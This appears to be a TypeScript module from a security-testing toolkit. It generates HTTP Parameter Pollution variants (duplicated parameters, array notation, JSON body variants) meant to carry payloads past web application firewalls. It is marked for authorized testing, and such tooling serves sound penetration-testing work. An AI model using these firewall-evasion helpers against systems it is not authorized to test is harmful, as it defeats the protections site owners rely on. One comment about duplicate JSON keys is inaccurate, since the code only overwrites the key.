/**
 * HTTP Parameter Pollution (HPP) techniques.
 *
 * HPP exploits how different web servers and frameworks handle duplicate parameters.
 * For example:
 *   - PHP uses the LAST occurrence: ?q=safe&q=payload → q = payload
 *   - ASP.NET concatenates them: ?q=safe&q=payload → q = safe,payload
 *   - Express/Node uses first or array depending on parser config
 *
 * These techniques can bypass WAFs that only inspect the first parameter occurrence
 * while the backend uses a different one.
 *
 * For authorized security testing only.
 */

/**
 * Duplicate a parameter in a URL to exploit HPP.
 * Returns multiple URL variants:
 * 1. Payload appended as second occurrence: ?param=original&param=payload
 * 2. Payload prepended as first occurrence: ?param=payload&param=original
 * 3. Both occurrences set to payload: ?param=payload&param=payload
 */
export function duplicateParam(url: string, param: string, value: string): string[] {
  const results: string[] = [];
  const parsed = new URL(url);
  const originalValue = parsed.searchParams.get(param);

  // Variant 1: payload appended (catches PHP/last-wins servers)
  const v1 = new URL(url);
  v1.searchParams.append(param, value);
  results.push(v1.toString());

  // Variant 2: payload prepended (catches first-wins servers like Express defaults)
  const v2 = new URL(url);
  // Remove existing, add payload first, then original
  v2.searchParams.delete(param);
  v2.searchParams.append(param, value);
  if (originalValue !== null) {
    v2.searchParams.append(param, originalValue);
  }
  results.push(v2.toString());

  // Variant 3: both set to payload (catches concatenation servers like ASP.NET)
  const v3 = new URL(url);
  v3.searchParams.delete(param);
  v3.searchParams.append(param, value);
  v3.searchParams.append(param, value);
  results.push(v3.toString());

  return results;
}

/**
 * Use array notation for the parameter.
 * Some frameworks (PHP, Rails) interpret param[] as an array.
 * This can bypass WAFs that only check "param" but not "param[]".
 *
 * Returns URL variants:
 * 1. param[]=value (array notation)
 * 2. param[0]=value (indexed array notation)
 * 3. Both original param=original and param[]=value
 */
export function arrayNotation(url: string, param: string, value: string): string[] {
  const results: string[] = [];
  const parsed = new URL(url);

  // Variant 1: param[]=value
  const v1 = new URL(url);
  v1.searchParams.delete(param);
  v1.searchParams.set(`${param}[]`, value);
  results.push(v1.toString());

  // Variant 2: param[0]=value (indexed)
  const v2 = new URL(url);
  v2.searchParams.delete(param);
  v2.searchParams.set(`${param}[0]`, value);
  results.push(v2.toString());

  // Variant 3: original param + array param (dual notation)
  const v3 = new URL(url);
  const original = parsed.searchParams.get(param);
  if (original !== null) {
    // Keep original param, add array notation alongside
    v3.searchParams.append(`${param}[]`, value);
  } else {
    v3.searchParams.set(`${param}[]`, value);
  }
  results.push(v3.toString());

  return results;
}

/**
 * Generate a JSON body with the payload injected in various ways.
 * Useful for APIs that accept JSON bodies where parameter names
 * might be duplicated or overridden via prototype pollution patterns.
 *
 * Returns an object suitable for use as a JSON POST body.
 */
export function jsonBodyInjection(param: string, value: string): object {
  return {
    [param]: value,
    // Duplicate key via toString override attempt
    [`${param}`]: value,
    // Nested object — some parsers flatten these
    data: {
      [param]: value,
    },
    // Array variant — some parsers pick first/last element
    [`${param}[]`]: [value],
  };
}

/**
 * Convenience function: generate all HPP URL variants for a given URL, parameter, and payload.
 * Combines duplicateParam and arrayNotation variants, deduplicating results.
 */
export function generateHppVariants(url: string, param: string, payload: string): string[] {
  const variants = new Set<string>();

  for (const v of duplicateParam(url, param, payload)) {
    variants.add(v);
  }
  for (const v of arrayNotation(url, param, payload)) {
    variants.add(v);
  }

  return [...variants];
}
